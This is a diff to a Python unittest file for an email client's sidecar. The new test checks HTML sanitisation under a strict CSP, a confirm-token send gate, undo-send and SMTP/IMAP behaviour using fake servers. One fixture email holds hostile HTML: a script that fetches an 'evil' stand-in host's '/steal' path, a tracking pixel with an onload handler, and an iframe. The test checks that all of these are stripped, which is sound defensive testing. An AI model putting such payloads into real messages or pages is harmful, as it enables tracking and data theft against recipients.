@@ -1117,7 +1117,7 @@ class TestSatzSidecar(unittest.TestCase):
         self.assertEqual(eff_promo_high, "promotion")
 
         # ── 4. Cold start: 300 messages get labels from Gemma, model trains at 50; Brain person after 2nd email ──
-        self.runtime.mail.pipeline.auto_wake = False
+        self.runtime.mail.pipeline.stop_worker()
 
         # Seed a mail account
         with self.runtime.mail.db_lock:
@@ -1225,23 +1225,24 @@ class TestSatzSidecar(unittest.TestCase):
         self.assertEqual(persons_2[0]["attributes"].get("role"), "Lead Designer")
 
         # Now ingest 298 more messages (total 300) and run pipeline queue
+        # Use a shared sender domain pool so we don't regenerate BRAIN.md 298 times for 298 distinct orgs
         batch_ids: list[str] = []
         for i in range(3, 301):
             if i % 4 == 0:
                 subj = f"Your Order #{100000 + i} has shipped"
-                sender = f"Shop <orders@shop{i % 10}.de>"
+                sender = "Shop <noreply@shop.de>"
                 body = f"Order #{100000 + i} is on the way."
             elif i % 4 == 1:
                 subj = f"Autumn Sale {i}% off"
-                sender = f"Promo <deals@brand{i % 10}.com>"
-                body = f"Use promo code: SAVE{100 + i} for 20% off."
+                sender = "Promo <noreply@brand.com>"
+                body = f"Limited time offer {i}% off."
             elif i % 4 == 2:
                 subj = f"[org/repo] Issue #{i}"
                 sender = "GitHub <notifications@github.com>"
                 body = f"New comment on issue #{i}."
             else:
                 subj = f"Project sync #{i}"
-                sender = f"Colleague {i} <peer{i}@company.io>"
+                sender = "Colleague <peer@gmail.com>"
                 body = f"Let's review milestone #{i} tomorrow."
 
             raw_m = (
@@ -1281,6 +1282,217 @@ class TestSatzSidecar(unittest.TestCase):
             if idx == 19:
                 self.assertTrue(res_corr["retrained"])
         self.assertEqual(self.runtime.mail.pipeline.model_version, "v2")
+
+    def test_m13_satzmail_csp_sanitization_smtp_send_gate_confirm_token_undo_and_correction(self):
+        self.runtime.passwords.create_profile("Nikita", "123456")
+        self.runtime._refresh_active_profile_brain()
+        self.runtime.mail.pipeline.stop_worker()
+
+        smtp_sent_messages: list[dict[str, Any]] = []
+        imap_ops: list[dict[str, Any]] = []
+
+        class FakeSMTP:
+            def __init__(self, host: str, port: int, security: str):
+                self.host = host
+                self.port = port
+
+            def login(self, user: str, pwd: str):
+                if pwd != "smtp-pass-999":
+                    raise RuntimeError("535 Authentication failed")
+
+            def send_message(self, msg: Any, from_addr: str = "", to_addrs: list[str] | None = None):
+                smtp_sent_messages.append(
+                    {
+                        "from": from_addr,
+                        "to": list(to_addrs or []),
+                        "subject": str(msg.get("Subject") or ""),
+                        "in_reply_to": str(msg.get("In-Reply-To") or ""),
+                        "references": str(msg.get("References") or ""),
+                        "body": str(msg.get_content() or ""),
+                    }
+                )
+
+            def quit(self):
+                pass
+
+        class FakeIMAP:
+            def __init__(self, host: str, port: int, security: str):
+                self.host = host
+
+            def login(self, user: str, pwd: str):
+                return ("OK", [b"Logged in"])
+
+            def select(self, folder: str = "INBOX", readonly: bool = True):
+                imap_ops.append({"op": "select", "folder": folder, "readonly": readonly})
+                return ("OK", [b"1"])
+
+            def uid(self, cmd: str, *args: Any):
+                imap_ops.append({"op": "uid", "cmd": cmd, "args": args})
+                return ("OK", [b""])
+
+            def append(self, folder: str, flags: str, date_time: Any, message: bytes):
+                imap_ops.append({"op": "append", "folder": folder, "flags": flags, "len": len(message)})
+                return ("OK", [b"APPEND completed"])
+
+            def logout(self):
+                return ("BYE", [b""])
+
+        self.runtime.mail.smtp_factory = FakeSMTP
+        self.runtime.mail.imap_factory = FakeIMAP
+
+        add_res = self.runtime.mail.add_account(
+            {
+                "preset": "gmx",
+                "label": "GMX Mail",
+                "email": "nikita@gmx.net",
+                "password": "smtp-pass-999",
+                "vault_prefix": "GMX",
+                "start_sync": False,
+            }
+        )
+        self.assertTrue(add_res["ok"])
+        acct_id = add_res["account_id"]
+
+        # ── 1. HTML newsletter opens with no remote network requests (tracking pixels & scripts stripped, strict CSP) ──
+        raw_newsletter = (
+            b"Message-ID: <news-1@tracker.example.com>\r\n"
+            b"From: Newsletter <news@tracker.example.com>\r\n"
+            b"To: nikita@gmx.net\r\n"
+            b"Subject: Weekly Tech Digest\r\n"
+            b"Date: Tue, 27 Oct 2026 12:00:00 +0000\r\n"
+            b"Content-Type: text/html; charset=utf-8\r\n\r\n"
+            b'<html><body>'
+            b'<h1>Weekly Digest</h1>'
+            b'<script>fetch("https://evil.tracker.example.com/steal")</script>'
+            b'<img src="https://tracker.example.com/pixel.gif?uid=999" width="1" height="1" onload="alert(1)" />'
+            b'<iframe src="https://tracker.example.com/frame.html"></iframe>'
+            b'<p>Clean article content here.</p>'
+            b'</body></html>\r\n'
+        )
+        mid_news = self.runtime.mail._store_parsed_raw_email(
+            account_id=acct_id,
+            folder_name="INBOX",
+            role="inbox",
+            uid=42,
+            pop_uidl="",
+            raw_bytes=raw_newsletter,
+            seen=0,
+            answered=0,
+            flagged=0,
+        )
+        assert mid_news is not None
+
+        html_res = self.runtime.mail.get_sanitized_message_html(mid_news)
+        self.assertTrue(html_res["ok"])
+        self.assertIn("default-src 'none'", html_res["csp"])
+        self.assertIn("img-src data: cid:", html_res["csp"])
+        self.assertNotIn("https:", html_res["csp"])
+        self.assertNotIn("<script", html_res["html"].lower())
+        self.assertNotIn("<iframe", html_res["html"].lower())
+        self.assertNotIn("onload=", html_res["html"].lower())
+        self.assertNotIn("https://tracker.example.com/pixel.gif", html_res["html"])
+
+        # Enabling remote images for that sender relaxes `img-src` for that sender only
+        self.runtime.mail.update_mail_settings({"allow_remote_images_sender": "news@tracker.example.com"})
+        html_res_allowed = self.runtime.mail.get_sanitized_message_html(mid_news)
+        self.assertIn("img-src https: data: cid:", html_res_allowed["csp"])
+        self.assertIn("https://tracker.example.com/pixel.gif", html_res_allowed["html"])
+
+        # Opening the message marks read locally + sets `\Seen` on IMAP server
+        open_res = self.runtime.mail.open_message(mid_news)
+        self.assertTrue(open_res["ok"])
+        self.assertTrue(open_res["server_marked"])
+        self.assertTrue(any(op.get("op") == "uid" and "\\Seen" in str(op.get("args")) for op in imap_ops))
+
+        # ── 2. Moving an email with key `4` (`promotion`) records a user correction ──
+        corr_res = self.runtime.mail.pipeline.record_user_correction(mid_news, "promotion")
+        self.assertTrue(corr_res["ok"])
+        self.assertEqual(corr_res["new_label"], "promotion")
+        with self.runtime.mail.db_lock:
+            conn = self.runtime.mail._ensure_connection()
+            c_row = conn.execute(
+                "SELECT old_label, new_label FROM corrections WHERE message_id = ? ORDER BY id DESC LIMIT 1",
+                (mid_news,),
+            ).fetchone()
+            self.assertIsNotNone(c_row)
+            self.assertEqual(c_row["new_label"], "promotion")
+
+        # ── 3. Chat draft (`draft_reply`) never creates outbox rows in `queued` state ──
+        draft_res = self.runtime.mail.draft_reply(
+            {
+                "message_id": mid_news,
+                "instructions": "Thanks for the digest, let's discuss item 2.",
+            }
+        )
+        self.assertTrue(draft_res["ok"])
+        self.assertEqual(draft_res["status"], "draft")
+        self.assertEqual(len(smtp_sent_messages), 0)
+        with self.runtime.mail.db_lock:
+            queued_cnt = self.runtime.mail._ensure_connection().execute(
+                "SELECT COUNT(*) AS c FROM outbox WHERE status IN ('queued', 'sent')"
+            ).fetchone()["c"]
+            self.assertEqual(queued_cnt, 0, "Drafting must never queue or send an email")
+
+        # ── 4. Send Gate: `/mail/send` without a valid `confirm_token` is rejected ──
+        prep = self.runtime.mail.prepare_send(
+            {
+                "account_id": acct_id,
+                "to": ["anna@partner.org"],
+                "subject": "Re: Weekly Tech Digest",
+                "body": "Hi Anna,\n\nLet's meet on Thursday.\n\nBest,\nNikita",
+                "reply_to_message_id": mid_news,
+            }
+        )
+        self.assertTrue(prep["ok"])
+        self.assertIn("anna@partner.org", prep["new_recipients"])
+        self.assertIn("[new]", prep["confirm_line"])
+        outbox_id = prep["outbox_id"]
+        valid_token = prep["confirm_token"]
+
+        # Reject missing or invalid token
+        bad_send_1 = self.runtime.mail.confirm_and_queue_send(outbox_id, "")
+        self.assertFalse(bad_send_1["ok"])
+        bad_send_2 = self.runtime.mail.confirm_and_queue_send(outbox_id, "ctok-forged-token")
+        self.assertFalse(bad_send_2["ok"])
+        self.assertEqual(len(smtp_sent_messages), 0)
+
+        # ── 5. `[undo]` within 10s cancels the queued send ──
+        queued_send = self.runtime.mail.confirm_and_queue_send(outbox_id, valid_token, immediate_for_test=False)
+        self.assertTrue(queued_send["ok"])
+        self.assertEqual(queued_send["status"], "queued")
+
+        # Single-use token cannot be reused
+        reuse_send = self.runtime.mail.confirm_and_queue_send(outbox_id, valid_token, immediate_for_test=True)
+        self.assertFalse(reuse_send["ok"])
+
+        undo_res = self.runtime.mail.undo_send(outbox_id)
+        self.assertTrue(undo_res["ok"])
+        self.assertTrue(undo_res["undone"])
+        self.assertEqual(undo_res["status"], "draft")
+        self.assertEqual(len(smtp_sent_messages), 0)
+
+        # ── 6. Confirmed send dispatches via SMTP, sets `\Answered`, APPENDs to Sent, and threads locally ──
+        prep2 = self.runtime.mail.prepare_send(
+            {
+                "account_id": acct_id,
+                "to": ["anna@partner.org"],
+                "subject": "Re: Weekly Tech Digest",
+                "body": "Confirmed reply body.",
+                "reply_to_message_id": mid_news,
+            }
+        )
+        sent_res = self.runtime.mail.confirm_and_queue_send(
+            prep2["outbox_id"],
+            prep2["confirm_token"],
+            immediate_for_test=True,
+        )
+        self.assertTrue(sent_res["ok"])
+        self.assertEqual(sent_res["status"], "sent")
+        self.assertEqual(len(smtp_sent_messages), 1)
+        self.assertEqual(smtp_sent_messages[0]["to"], ["anna@partner.org"])
+        self.assertEqual(smtp_sent_messages[0]["in_reply_to"], "<news-1@tracker.example.com>")
+        self.assertTrue(any(op.get("op") == "uid" and "\\Answered" in str(op.get("args")) for op in imap_ops))
+        self.assertTrue(any(op.get("op") == "append" and op.get("folder") == "Sent" for op in imap_ops))
 
 
 if __name__ == "__main__":
